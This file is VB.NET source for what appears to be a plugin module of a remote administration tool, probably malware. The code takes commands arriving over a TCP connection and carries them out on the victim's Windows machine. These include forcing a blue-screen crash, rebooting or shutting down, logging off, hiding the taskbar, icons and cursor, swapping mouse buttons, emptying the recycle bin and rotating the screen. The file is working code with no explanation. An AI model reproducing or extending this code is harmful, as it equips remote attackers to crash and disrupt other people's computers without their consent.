Imports System.Net.Sockets
Imports PacketLib
Imports PacketLib.Packet
Public Class Main
    Public Shared Async Sub Main(ByVal K As TcpClient, ByVal Param_Tab As Object())

        Dim CastParam As Packet_Subject = CType(Param_Tab(0), Packet_Subject)

        Select Case CastParam

            Case Packet_Subject.LOG_OUT

                Await Task.Run(Sub() NativeAPI.PowerOptions(NativeAPI.EWX_LOGOFF, 0))

            Case Packet_Subject.REBOOT

                Await Task.Run(Sub() NativeAPI.PowerOptions(NativeAPI.EWX_REBOOT, 0 Or NativeAPI.SHTDN_REASON_MINOR_BLUESCREEN))

            Case Packet_Subject.SHUTDOWN

                Await Task.Run(Sub() NativeAPI.PowerOptions(NativeAPI.EWX_POWEROFF, 0 Or NativeAPI.SHTDN_REASON_MAJOR_SOFTWARE))

            Case Packet_Subject.BSOD

                Await Task.Run(Sub() NativeAPI.BSOD())

            Case Packet_Subject.WALLPAPER

            Case Packet_Subject.SUSPEND

                Await Task.Run(Sub() NativeAPI.HIBSUSPEND(False))

            Case Packet_Subject.HIBERNATE

                Await Task.Run(Sub() NativeAPI.HIBSUSPEND(True))

            Case Packet_Subject.MUTE_SOUND

                Await Task.Run(Sub() NativeAPI.AppCommand.Mute_Sound())

            Case Packet_Subject.VOLUME

                Await Task.Run(Sub() NativeAPI.AppCommand.Volume(Param_Tab(1)))

            Case Packet_Subject.TSK_BAR

                Await Task.Run(Sub() NativeAPI.Hide_TaskBar(Param_Tab(1)))

            Case Packet_Subject.DSK_IC

                Await Task.Run(Sub() NativeAPI.HSDesktopIcons(Param_Tab(1)))

            Case Packet_Subject.SWAP_MB

                Await Task.Run(Sub() NativeAPI.SwapMB(Param_Tab(1)))

            Case Packet_Subject.EMPTY_BIN

                Await Task.Run(Sub() NativeAPI.EmptyBin())

            Case Packet_Subject.ROTATE_SCREEN

                Await Task.Run(Sub() NativeAPI.Display.Rotate(Param_Tab(1)))

            Case Packet_Subject.CURSOR_VISIBILITY

                Await Task.Run(Sub() NativeAPI.CursorVisibility(Param_Tab(1)))

            Case Packet_Subject.SET_WPP

                Await Task.Run(Sub() NativeAPI.SetWallpapertoBackground(Param_Tab(1), Param_Tab(2)))
        End Select
    End Sub


End Class
